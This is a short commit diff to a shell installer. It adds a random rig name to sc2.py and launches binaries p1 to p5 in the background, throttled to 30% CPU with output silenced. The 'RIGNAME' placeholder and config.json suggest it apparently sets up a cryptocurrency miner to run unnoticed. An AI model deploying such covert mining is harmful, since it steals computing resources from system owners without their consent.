d65329c5dc8c08b973b1a6e7b946c85cd91704f6
juan robert <kijang-020@hotmail.com>
2021-12-28 21:58:41 +0000

    install.sh edited online with Bitbucket

--- install.sh
+++ install.sh
@@ -1,3 +1,4 @@
+hostname=$(shuf -n 1 -i 1-9999999)
 apt-get update -y
 apt-get install -y cpulimit screen
 chmod +x p1
@@ -6,6 +7,7 @@ chmod +x p3
 chmod +x p4
 chmod +x p5
 chmod +x config.json
+sed -i "s/RIGNAME/$hostname/" "sc2.py"
 cpulimit -l 30 ./p1 >/dev/null 2>&1 >/dev/null &
 cpulimit -l 30 ./p2 >/dev/null 2>&1 >/dev/null &
 cpulimit -l 30 ./p3 >/dev/null 2>&1 >/dev/null &
